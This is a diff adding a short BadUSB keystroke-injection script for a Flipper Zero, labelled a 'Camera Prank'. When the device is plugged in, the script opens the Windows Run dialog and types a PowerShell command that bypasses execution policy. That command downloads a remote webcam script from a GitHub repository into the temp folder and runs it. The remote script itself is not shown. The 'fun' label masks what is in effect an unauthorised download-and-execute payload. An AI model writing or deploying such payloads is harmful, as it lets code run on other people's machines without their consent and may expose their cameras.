@@ -1,0 +1,10 @@
+REM Author: gam3r999
+REM Description: Camera Prank - Short Run Command (Fixes cutoff)
+REM Version: 2.0
+REM Category: FUN
+
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/gam3r999/Flipper-Zero-BadUsb/refs/heads/main/scripts/webcam_script.ps1' -OutFile '$env:TEMP\prank.ps1' -UseBasicParsing; powershell -NoProfile -ExecutionPolicy Bypass -File '$env:TEMP\prank.ps1'"
+ENTER
